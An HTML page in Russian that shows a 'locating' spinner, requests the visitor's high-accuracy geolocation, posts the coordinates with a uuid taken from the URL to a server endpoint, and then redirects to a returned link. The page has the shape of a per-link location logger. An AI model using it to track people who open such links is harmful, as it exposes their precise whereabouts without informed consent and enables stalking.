<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Locating...</title>
  <style>
    body {
      margin: 0;
      font-family: 'Helvetica Neue', sans-serif;
      background-color: #f6f6f6;
      color: #333;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
    }

    .loader {
      border: 6px solid #e0e0e0;
      border-top: 6px solid #4caf50;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin-bottom: 16px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    p {
      font-size: 1rem;
      text-align: center;
      max-width: 300px;
    }
  </style>
</head>
<body>
  <div class="loader"></div>
  <p>Определяем местоположение…</p>

  <script>
    async function sendLocation(position) {
      const params = new URLSearchParams(window.location.search);
      const uuid = params.get("uuid");

      if (!uuid) return;

      try {
        const response = await fetch('/api/get-link', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            uuid,
            latitude: position.coords.latitude,
            longitude: position.coords.longitude
          })
        });

        const data = await response.json();
        if (data.redirectTo) {
          window.location.href = data.redirectTo;
        } else {
          document.querySelector('p').textContent = "Ошибка: ссылка не найдена.";
        }
      } catch (e) {
        console.error("Ошибка при отправке локации:", e);
        document.querySelector('p').textContent = "Ошибка при отправке локации.";
      }
    }

    function handleError() {
      document.querySelector('p').textContent = "Не удалось получить геолокацию.";
    }

    navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
      enableHighAccuracy: true,
      timeout: 10000
    });
  </script>
</body>
</html>
